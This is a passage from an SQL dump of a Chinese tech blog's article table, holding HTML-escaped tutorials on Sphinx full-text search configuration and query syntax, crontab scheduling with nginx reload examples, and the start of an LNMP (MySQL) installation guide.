\r\nU+0621..U+063A, U+01B9,U+01BF, U+0640..U+064A, U+0660..U+0669, U+066E, U+066F,  \r\nU+0671..U+06D3, U+06F0..U+06FF,U+0904..U+0939, U+0958..U+095F, U+0960..U+0963,  \r\nU+0966..U+096F, U+097B..U+097F,U+0985..U+09B9, U+09CE, U+09DC..U+09E3, U+09E6..U+09EF,  \r\nU+0A05..U+0A39, U+0A59..U+0A5E,U+0A66..U+0A6F, U+0A85..U+0AB9, U+0AE0..U+0AE3,  \r\nU+0AE6..U+0AEF, U+0B05..U+0B39,U+0B5C..U+0B61, U+0B66..U+0B6F, U+0B71, U+0B85..U+0BB9,  \r\nU+0BE6..U+0BF2, U+0C05..U+0C39,U+0C66..U+0C6F, U+0C85..U+0CB9, U+0CDE..U+0CE3,  \r\nU+0CE6..U+0CEF, U+0D05..U+0D39, U+0D60,U+0D61, U+0D66..U+0D6F, U+0D85..U+0DC6,  \r\nU+1900..U+1938, U+1946..U+194F, U+A800..U+A805,U+A807..U+A822, U+0386-&amp;gt;U+03B1,  \r\nU+03AC-&amp;gt;U+03B1, U+0388-&amp;gt;U+03B5, U+03AD-&amp;gt;U+03B5,U+0389-&amp;gt;U+03B7, U+03AE-&amp;gt;U+03B7,  \r\nU+038A-&amp;gt;U+03B9, U+0390-&amp;gt;U+03B9, U+03AA-&amp;gt;U+03B9,U+03AF-&amp;gt;U+03B9, U+03CA-&amp;gt;U+03B9,  \r\nU+038C-&amp;gt;U+03BF, U+03CC-&amp;gt;U+03BF, U+038E-&amp;gt;U+03C5,U+03AB-&amp;gt;U+03C5, U+03B0-&amp;gt;U+03C5,  \r\nU+03CB-&amp;gt;U+03C5, U+03CD-&amp;gt;U+03C5, U+038F-&amp;gt;U+03C9,U+03CE-&amp;gt;U+03C9, U+03C2-&amp;gt;U+03C3,  \r\nU+0391..U+03A1-&amp;gt;U+03B1..U+03C1,U+03A3..U+03A9-&amp;gt;U+03C3..U+03C9, U+03B1..U+03C1,  \r\nU+03C3..U+03C9, U+0E01..U+0E2E,U+0E30..U+0E3A, U+0E40..U+0E45, U+0E47, U+0E50..U+0E59,  \r\nU+A000..U+A48F, U+4E00..U+9FBF,U+3400..U+4DBF, U+20000..U+2A6DF, U+F900..U+FAFF,  \r\nU+2F800..U+2FA1F, U+2E80..U+2EFF,U+2F00..U+2FDF, U+3100..U+312F, U+31A0..U+31BF,  \r\nU+3040..U+309F, U+30A0..U+30FF,U+31F0..U+31FF, U+AC00..U+D7AF, U+1100..U+11FF,  \r\nU+3130..U+318F, U+A000..U+A48F,U+A490..U+A4CF  \r\n                                             \r\n    min_prefix_len  = 0 \r\n    min_infix_len  = 1 \r\n    ngram_len = 1 \r\n                                             \r\n    ngram_chars = U+4E00..U+9FBF, U+3400..U+4DBF, U+20000..U+2A6DF, U+F900..U+FAFF, \r\nU+2F800..U+2FA1F, U+2E80..U+2EFF, U+2F00..U+2FDF, U+3100..U+312F, U+31A0..U+31BF, \r\nU+3040..U+309F, U+30A0..U+30FF, U+31F0..U+31FF, U+AC00..U+D7AF, U+1100..U+11FF, \r\nU+3130..U+318F, U+A000..U+A48F, U+A490..U+A4CF \r\n} \r\n                                             \r\nindexer \r\n{ \r\n    mem_limit       = 32M \r\n} \r\n                                             \r\nsearchd \r\n{ \r\n    listen          = 9312 \r\n    log         = /usr/local/sphinx/log/searchd.log \r\n    query_log       = /usr/local/sphinx/log/query.log \r\n    read_timeout            = 5 \r\n    max_children            = 30 \r\n    pid_file        = /usr/local/sphinx/log/searchd.pid \r\n    max_matches     = 1000 \r\n    seamless_rotate         = 1 \r\n    preopen_indexes         = 1 \r\n    unlink_old      = 1 \r\n    workers         = threads # for RT to work \r\n}&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;建立索引文件&lt;/strong&gt;&lt;/span&gt;并启动sphinx服务进程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;# 启动indexer建立索引文件 这里只建立一个索引文件所以直接用索引名laugh，如果有多个数据源，想一次建立全部索引需要用--all \r\nsudo /usr/local/bin/indexer --config /usr/local/sphinx/sphinx.conf laugh \r\n# 运行检索守护进程searchd 此时系统会在9312端口侦听mysql的全文检索请求 \r\nsudo /usr/local/bin/searchd --config /usr/local/sphinx/sphinx.conf&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;sphinx检索&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;关于检索的语法和匹配模式调用，参考文章：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/7313052&quot;&gt;http://blog.csdn.net/luochuan/article/details/7313052&lt;/a&gt;&lt;/p&gt;&lt;p&gt;我们可以安装SphinxSE来调用Sphinx，详细信息参考：&lt;a target=&quot;_blank&quot; href=&quot;http://www.coreseek.cn/products-install/sphinxse/&quot;&gt;http://www.coreseek.cn/products-install/sphinxse/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;这里介绍通过调用官方API来调用Sphinx检索数据，Sphinx官方提供了Python，Java，Php的API，首先我们引入API文件sphinxclient.php，然后连接sphinx服务器进行查询操作，PHP代码如下：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\ninclude(&#039;sphinxclient.php&#039;); //加载Sphinx API \r\n$sphinx = new SphinxClient(); //实例化API类 \r\n$sphinx-&amp;gt;setServer(&#039;localhost&#039;,9312); //设置连接的服务器，地址, 端口 \r\n$res = $sphinx-&amp;gt;query(&#039;配置&#039;, &#039;laugh&#039;); //执行检索，关键字, 索引名 多个索引用,分割，查询全部索引用*表示 \r\necho &quot;&amp;lt;PRE&amp;gt;&quot;; \r\nprint_r($res);&lt;/pre&gt;&lt;p&gt;结果：&lt;/p&gt;&lt;pre class=&quot;brush:plain;toolbar:false;&quot;&gt;Array \r\n( \r\n    [error] =&amp;gt;  \r\n    [warning] =&amp;gt;  \r\n    [status] =&amp;gt; 0 \r\n    [fields] =&amp;gt; Array \r\n        ( \r\n            [0] =&amp;gt; title \r\n            [1] =&amp;gt; link \r\n        ) \r\n               \r\n    [attrs] =&amp;gt; Array \r\n        ( \r\n            [article_id] =&amp;gt; 1 \r\n        ) \r\n               \r\n    [matches] =&amp;gt; Array \r\n        ( \r\n            [6] =&amp;gt; Array \r\n                ( \r\n                    [weight] =&amp;gt; 2 \r\n                    [attrs] =&amp;gt; Array \r\n                        ( \r\n                            [article_id] =&amp;gt; 6 \r\n                        ) \r\n               \r\n                ) \r\n               \r\n            [7] =&amp;gt; Array \r\n                ( \r\n                    [weight] =&amp;gt; 2 \r\n                    [attrs] =&amp;gt; Array \r\n                        ( \r\n                            [article_id] =&amp;gt; 7 \r\n                        ) \r\n               \r\n                ) \r\n               \r\n            [8] =&amp;gt; Array \r\n                ( \r\n                    [weight] =&amp;gt; 2 \r\n                    [attrs] =&amp;gt; Array \r\n                        ( \r\n                            [article_id] =&amp;gt; 8 \r\n                        ) \r\n               \r\n                ) \r\n               \r\n            [9] =&amp;gt; Array \r\n                ( \r\n                    [weight] =&amp;gt; 2 \r\n                    [attrs] =&amp;gt; Array \r\n                        ( \r\n                            [article_id] =&amp;gt; 9 \r\n                        ) \r\n               \r\n                ) \r\n               \r\n            [17] =&amp;gt; Array \r\n                ( \r\n                    [weight] =&amp;gt; 2 \r\n                    [attrs] =&amp;gt; Array \r\n                        ( \r\n                            [article_id] =&amp;gt; 17 \r\n                        ) \r\n               \r\n                ) \r\n               \r\n            [18] =&amp;gt; Array \r\n                ( \r\n                    [weight] =&amp;gt; 2 \r\n                    [attrs] =&amp;gt; Array \r\n                        ( \r\n                            [article_id] =&amp;gt; 18 \r\n                        ) \r\n               \r\n                ) \r\n               \r\n            [19] =&amp;gt; Array \r\n                ( \r\n                    [weight] =&amp;gt; 2 \r\n                    [attrs] =&amp;gt; Array \r\n                        ( \r\n                            [article_id] =&amp;gt; 19 \r\n                        ) \r\n               \r\n                ) \r\n               \r\n        ) \r\n               \r\n    [total] =&amp;gt; 7 \r\n    [total_found] =&amp;gt; 7 \r\n    [time] =&amp;gt; 0.000 \r\n    [words] =&amp;gt; Array \r\n        ( \r\n            [配] =&amp;gt; Array \r\n                ( \r\n                    [docs] =&amp;gt; 7 \r\n                    [hits] =&amp;gt; 7 \r\n                ) \r\n               \r\n            [置] =&amp;gt; Array \r\n                ( \r\n                    [docs] =&amp;gt; 7 \r\n                    [hits] =&amp;gt; 7 \r\n                ) \r\n               \r\n        ) \r\n               \r\n)&lt;/pre&gt;&lt;p&gt;&lt;br /&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;matches就是检索出的匹配索引&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;说明：&lt;span style=&quot;color:#000000&quot;&gt;weight 权重 attrs sql_attr_*的配置&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：&lt;/span&gt;Sphinx并没有连接到Mysql以获取数据，所以我们需要根据Sphinx的检索结果再次查询Mysql以获取我们需要的真实数据。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;参考文章：&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://hi.baidu.com/leukoli/blog/item/a75a5d1f36df99fde1fe0bd7.html&quot;&gt;http://hi.baidu.com/leukoli/blog/item/ce4e0251f42900878d5430d0.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://hi.baidu.com/leukoli/blog/item/a75a5d1f36df99fde1fe0bd7.html&quot;&gt;http://hi.baidu.com/leukoli/blog/item/664f1ffbeee1d92a4e4aead1.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386772685),
(31, 31, '&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;Sphinx检索语法与匹配模式&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;匹配模式&lt;/span&gt;&lt;/p&gt;&lt;p&gt;SPH_MATCH_ALL，匹配所有查询词（缺省模式）&lt;/p&gt;&lt;p&gt;SPH_MATCH_ANY，匹配任意查询词&lt;/p&gt;&lt;p&gt;SPH_MATCH_PHRASE，短语匹配&lt;/p&gt;&lt;p&gt;SPH_MATCH_BOOLEAN，布尔表达式匹配&lt;/p&gt;&lt;p&gt;SPH_MATCH_EXTENDED，查询匹配一个Sphinx内部查询语言表达式&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;布尔查询语法(Boolean query syntax)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;布尔查询允许使用下面特殊操作符：&lt;/p&gt;&lt;p&gt;AND：hello &amp;amp; world&lt;/p&gt;&lt;p&gt;OR：hello | world&lt;/p&gt;&lt;p&gt;NOT：hello -world或hello !world&lt;/p&gt;&lt;p&gt;Grouping：(hello world)&lt;/p&gt;&lt;p&gt;举一个使用这些操作符的例子：&lt;/p&gt;&lt;p&gt;( cat -dog ) | ( cat -mouse)&lt;/p&gt;&lt;p&gt;AND是一个隐式操作符，&ldquo;hello world&rdquo;就相当于&ldquo;hello &amp;amp; world&rdquo;。&lt;/p&gt;&lt;p&gt;OR的优先级高于AND，所以&ldquo;looking for cat | dog | mouse&rdquo;的意思是&ldquo;looking for (cat | dog | mouse)&rdquo;而不是&ldquo;(looking for cat) | dog | mouse&rdquo;&lt;/p&gt;&lt;p&gt;象&ldquo;-dog&rdquo;这种隐式地包含了所有查询记录，是不会被执行的。这主要是考虑到技术上与性能上的原因，从技术上来说，sphinx不能总保持所有文章的ID列表，性能上来说，当结果集巨大（10-100M），执行这样的查询将费耗较长时间。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;扩展查询语法(Extended query syntax)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;扩展查询允许合我下面特殊操作符：&lt;/p&gt;&lt;p&gt;操作符OR：hello | world&lt;/p&gt;&lt;p&gt;操作符NOT：hello -world或hello !world&lt;/p&gt;&lt;p&gt;字段搜索操作符：@title hello @body world&lt;/p&gt;&lt;p&gt;短语(phrase)搜索符：&rdquo;hello world&rdquo;&lt;/p&gt;&lt;p&gt;临近(proximity)搜索符：&rdquo;hello world&rdquo;~10&lt;/p&gt;&lt;p&gt;举例：&lt;/p&gt;&lt;p&gt;&ldquo;hello world&rdquo; @title &ldquo;example program&rdquo;~5 @body python -(php|perl)&lt;/p&gt;&lt;p&gt;AND是一个隐式操作符，&rdquo;hello world&rdquo;表示hello与world都要出现在匹配的记录中。&lt;/p&gt;&lt;p&gt;OR的优先级高于AND，所以&ldquo;looking for cat | dog | mouse&rdquo;的意思是&ldquo;looking for (cat | dog | mouse)&rdquo;而不是&ldquo;(looking for cat) | dog | mouse&rdquo;&lt;/p&gt;&lt;p&gt;临近距离在串中标明了，主要是用来调整单词数量，应用在引号中的所有查询字串。&rdquo;cat dog mouse&rdquo;~5表示包括这三个单词在内，总共不能多于8个单词的间隔。比如&rdquo;CAT aaa bbb ccc DOG eee fff MOUSE&rdquo;就不能匹配这个查询，因为单词间隔刚好是8个。&lt;/p&gt;&lt;p&gt;象aaa | ( bbb ccc | ( ddd eee ) )这样的括号嵌套查询目前还不支持，但以后会修正的。&lt;/p&gt;&lt;p&gt;否定（如NOT）只允许出现在顶层，不允许出现在括号内（如groups）。这点是不会改变的。因为支持否定嵌套查询会让短语排序(phrase ranking)的实现变得过于复杂。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;权重(匹配度，Weight)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;采用什么权重功能取决于搜索模式（Search mode）&lt;/p&gt;&lt;p&gt;在权重函数中，有两个主要部分：（短语排名）phrase rank和statistical rank（统计排名）&lt;/p&gt;&lt;p&gt;短语排名是基于搜索词在文档和查询短语中的最长公共子序列(LCS)的长度。所以如果在记录中有切确的短语匹配，记录的短语排名将有可能是最高的，等于查询单词的总个数。&lt;/p&gt;&lt;p&gt;统计排名是建立在经典的BM25算法基础之上，它只考虑词频。词在全部文档集合中以低的频度出现或高频度出现在匹配的文档中，那么它获得的权重就越大，最终的BM25权重是一个介于0到1之间的小数。&lt;/p&gt;&lt;p&gt;好的子短语匹配得到好的排名,最好的匹配放到最顶端。Sphinx作者的经验是：基于排名的密切短语比其它任何单独的统计方式表现出较好的搜索质量。&lt;/p&gt;&lt;p&gt;在SPH_MATCH_BOOLEAN 模式中，不需要计算权重，每条匹配记录的权重都是1&lt;/p&gt;&lt;p&gt;在SPH_MATCH_ALL和SPH_MATCH_PHRASE模式中，最终的权重是短语排名权重的总和&lt;/p&gt;&lt;p&gt;在SPH_MATCH_ANY模式中，本质上是一样的，但它也增加了每个字段的匹配单词数量，在这之前，短语排名权重乘以一个足够大的值以保证在任意一个字段的较高短语排名可以匹配排名较高者，即使它的字段权重比较低。&lt;/p&gt;&lt;p&gt;在SPH_MATCH_EXTENDED模式中，最终的权重是短语权重和BM25权重的总和，再乘以1000取整。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386772800),
(32, 32, '&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px&quot;&gt;Crontab简介&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;&lt;code&gt;&lt;br /&gt;&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://zh.wikipedia.org/wiki/Crontab&quot;&gt;WIKI：&lt;/a&gt;crontab&lt;/code&gt;&lt;/strong&gt;命令常见于&lt;a href=&quot;http://zh.wikipedia.org/wiki/Unix&quot; title=&quot;Unix&quot; class=&quot;mw-redirect&quot;&gt;Unix&lt;/a&gt;和&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E7%B1%BBUnix&quot; title=&quot;类Unix&quot; class=&quot;mw-redirect&quot;&gt;类Unix&lt;/a&gt;的&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F&quot; title=&quot;操作系统&quot;&gt;操作系统&lt;/a&gt;之中，用于设置周期性被执行的指令。该命令从标准输入设备读取指令，并将其存放于&ldquo;crontab&rdquo;文件中，以供之后读取和执行。该词来源于&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%B8%8C%E8%85%8A%E8%AF%AD&quot; title=&quot;希腊语&quot;&gt;希腊语&lt;/a&gt; chronos(&chi;&rho;ό&nu;&omicron;&sigmaf;)，原意是时间。&lt;/p&gt;&lt;p&gt;通常，&lt;strong&gt;&lt;code&gt;crontab&lt;/code&gt;&lt;/strong&gt;储存的指令被&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B&quot; title=&quot;守护进程&quot;&gt;守护进程&lt;/a&gt;激活，&lt;code&gt;crond&lt;/code&gt;常常在后台运行，每一分钟检查是否有预定的作业需要执行。这类作业一般称为&lt;strong&gt;cron jobs&lt;/strong&gt;。&lt;/p&gt;&lt;p&gt;crontab文件包含送交cron&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B&quot; title=&quot;守护进程&quot;&gt;守护进程&lt;/a&gt;的一系列作业和指令。每个用户可以拥有自己的crontab文件；同时，操作系统保存一个针对整个系统的crontab文件，该文件通常存放于/etc或者/etc之下的子目录中，而这个文件只能由系统管理员来修改。&lt;/p&gt;&lt;p&gt;crontab文件的每一行均遵守特定的格式，由空格或tab分隔为数个领域，每个领域可以放置单一或多个数值。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;命令行结构&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;crontab [-u user] [file]&lt;/span&gt;&lt;/p&gt;&lt;p&gt;用指定的file代替某个用户目前的crontab文件，如果没有指定file，则接受标准输入（键盘）上键入的命令，并将他们加入到crontab目录下。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;&lt;/span&gt;&lt;span style=&quot;color:#339999&quot;&gt;crontab [-u user] [-i] [-l | -e | -r]&lt;/span&gt;&lt;/p&gt;&lt;p&gt;-i 在删除某个用户crontab文件时提示确认信息（是/否）&lt;br /&gt;&lt;/p&gt;&lt;p&gt;-l 列出某个用户的crontab文件&lt;/p&gt;&lt;p&gt;-e 编辑某个用户的crontab文件&lt;/p&gt;&lt;p&gt;-r 删除 某个用户的crontab文件&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;例子：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;sudo crontab -u buzhidao -l&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;打印用户buzhidao的crontab文件&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;sudo crontab -u buzhidao -e&lt;/span&gt;&lt;/p&gt;&lt;p&gt;打开并编辑用户buzhidao的crontab文件&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;sudo crontab -u buzhidao -i -r&lt;/span&gt;&lt;/p&gt;&lt;p&gt;提示你是否确认删除某个用户的crontab文件&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;crontab文件的内容命令格式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;# 文件格式说明 \r\n#  &mdash;&mdash;分钟 (0 - 59) \r\n# |  &mdash;&mdash;小时 (0 - 23) \r\n# | |  &mdash;&mdash;日   (1 - 31) \r\n# | | |  &mdash;&mdash;月   (1 - 12) \r\n# | | | |  &mdash;&mdash;星期 (0 - 7)（星期日=0或7） \r\n# | | | | | \r\n# * * * * * 被执行的命令（cmd）&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：&lt;/span&gt;对于星期域，0和7都表示星期日，如果同时指定了日和星期，则如果其中任一条件满足，执行指令即被执行&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;操作符号&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;对于crontab文件的内容，每个 区域同时支持多个数值&lt;/p&gt;&lt;p&gt;1、用逗号&lsquo;,&rsquo;分开多个值，例如3月、5月、8月、9月可以表示为3,5,8,9&lt;/p&gt;&lt;p&gt;2、用连接符&amp;#39;-&amp;#39;指定值的范围，例如1-6可以表示1,2,3,4,5,6&lt;/p&gt;&lt;p&gt;3、用*表示所有值，例如在小时域里的*代表每一个小时&lt;/p&gt;&lt;p style=&quot;color:#cc0000&quot;&gt;例子：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;0 1 * * 0-6 /usr/local/nginx/sbin/nginx -s reload&lt;/span&gt;&lt;/p&gt;&lt;p&gt;每天的凌晨1点重启nginx服务&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;0 */2 * * 0 &lt;/span&gt;&lt;span style=&quot;color:#339999&quot;&gt;/usr/local/nginx/sbin/nginx -s reload&lt;/span&gt;&lt;/p&gt;&lt;p&gt;周日每隔2小时重启nginx服务&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;0 1 * * 0,5 /usr/local/nginx/sbin/nginx -s reload&lt;/span&gt;&lt;/p&gt;&lt;p&gt;每周的周五、周日凌晨1点重启nginx服务&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;0,30 1-3 1 * * &lt;/span&gt;&lt;span style=&quot;color:#339999&quot;&gt;/usr/local/nginx/sbin/nginx -s reload&lt;/span&gt;&lt;/p&gt;&lt;p&gt;每月1日的凌晨1到3点，每隔30分钟重启nginx一次&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;0 23 8 5 * &lt;/span&gt;&lt;span style=&quot;color:#339999&quot;&gt;/usr/local/nginx/sbin/nginx -s reload&lt;/span&gt;&lt;/p&gt;&lt;p&gt;5月8日的晚上23点重启nginx服务&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;具体使用过程&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;下面以每隔10分钟自动重启nginx服务作为测试例子&lt;/p&gt;&lt;p&gt;系统：ubuntu11.10&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#检查crontab是否启动 \r\n$service cron status \r\n#打印root用户的crontab文件内容 \r\n$sudo crontab -u root -l \r\n#打开并编辑root用户的crontab文件 \r\n$sudo crontab -u root -e \r\n#默认用vi打开，加入以下命令 */10 * * * * /usr/local/nginx/sbin/nginx -s reload 保存并退出 \r\n$sudo crontab -u root -l&lt;/pre&gt;&lt;p&gt;可以看到我们新加入的命令已经被载入，crontab进程会自动重新加载crontab文件然后&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;#查看nginx进程运行状况 \r\n$ps -aux | grep nginx&lt;/pre&gt;&lt;p&gt;通过输出的nginx的启动时间，可以看到我们设置的crontab命令已经起作用&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386773028);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(33, 33, '&lt;p&gt;LNMP安装配置&lt;/p&gt;&lt;p&gt;mysql ： &lt;a target=&quot;_blank&quot; href=&quot;http://dev.mysql.com/downloads/mysql/&quot;&gt;http://dev.mysql.com/downloads/mysql/&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;php ：&lt;a target=&quot;_blank&quot; href=&quot;http://cn.php.net/get/php-5.3.6.tar.gz/from/cn2.php.net/mirror&quot;&gt;http://cn.php.net/get/php-5.3.6.tar.gz/from/cn2.php.net/mirror&lt;/a&gt;&lt;/p&gt;&lt;p&gt;nginx ：&lt;a target=&quot;_blank&quot; href=&quot;http://nginx.org/download/nginx-1.0.13.tar.gz&quot;&gt;http://nginx.org/download/nginx-1.0.13.tar.gz&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;注意：&lt;/span&gt;mysql下载类型选择source code，最后一个tar.gz包&lt;/p&gt;&lt;p&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;如果安装包是tar.bz2格式的，请用 tar -jxvf xxx.tar.bz2命令解压&lt;br /&gt;&lt;/p&gt;&lt;p&gt;安装过程中可能会遇到提示有些软件或者lib未找到的错误，像libncurses5-dev, chkconfig, libiconv, libmcrypt, pcre, libjpeg, libpng, cmake等，需要自己下载手动安装&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;安装CMAKE&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;下载：&lt;a target=&quot;_blank&quot; href=&quot;http://www.cmake.org/cmake/resources/software.html&quot;&gt;http://www.cmake.org/cmake/resources/software.html&lt;/a&gt;&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;tar -zxvf cmake-2.8.7.tar.gz\r\n./bootstrap\r\n./configure\r\nmake &amp;amp;&amp;amp; make install&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span style=&quot;background-color:#ffffff&quot;&gt;报错提示：&lt;strong&gt;Cannot find&lt;/strong&gt; appropriate &lt;strong&gt;Makefile&lt;/strong&gt; processor on this system.&lt;br /&gt;解决 ： yum install make&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span style=&quot;background-color:#ffffff&quot;&gt;&lt;span style=&quot;color:#009900&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;font-size:16px&quot;&gt;安装MYSQL&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;版本：5.5.19&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;mkdir /usr/local/mysql\r\nmkdir /usr/local/mysql/data\r\ngroupadd mysql\r\nuseradd -g mysql mysql\r\nchown -R mysql /usr/local/mysql\r\nchown -R mysql.mysql /usr/local/mysql/data\r\ntar -zxvf mysql-5.5.19.tar.gz\r\ncd mysql-5.5.19\r\ncmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql\r\n-DDEFAULT_CHARSET=utf8\r\n-DDEFAULT_COLLATION=utf8_unicode_ci\r\n-DMYSQL_DATADIR=/usr/local/mysql/data\r\n-DWITH_INNOBASE_STORAGE_ENGINE=1\r\n-DENABLED_LOCAL_INFILE=1\r\n-DEXTRA_CHARSETS=all\r\n-DDEFAULT_CHARSET=utf8\r\n-DDEFAULT_COLLATION=utf8_general_ci\r\n-DSYSCONFDIR=/etc\r\n-DMYSQL_UNIX_ADDR=/tmp/mysqld.sock\r\n-DMYSQL_TCP_PORT=3306\r\nmake &amp;amp;&amp;amp; make install\r\ncd ../mysql\r\nchmod +w .\r\nmkdir -p /var/mysql\r\nmkdir -p /var/mysql/data\r\nmkdir -p /var/mysql/log\r\nchown -R mysql.mysql /var/mysql\r\ncp support-files/my-large.cnf /etc/my.cnf\r\ncp support-files/mysql.server /etc/init.d/mysqld\r\n./scripts/mysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --defaults-file=/etc/my.cnf&lt;/pre&gt;&lt;p&gt;安装完成之后，启动mysql服务&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;/etc/init.d/mysqld start&lt;/pre&gt;&lt;p&gt;修改mysql的root用户密码&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;mysql -u root -p\r\nmysql&amp;gt;use mysql\r\nmysql&amp;gt;UPDATE user SET password=PASSWORD(&#039;123456&#039;) WHERE user=&#039;root&#039;\r\n    -&amp;gt;g\r\nmysql&amp;gt;q\r\n/etc/init.d/mysqld restart&lt;/pre&gt;&lt;p&gt;将mysql加入开机启动项&lt;/p&gt;&lt;pre class=&quot;brush:bash;toolbar:false;&quot;&gt;chkconfig --add mysqld\r\nchkconfig --level 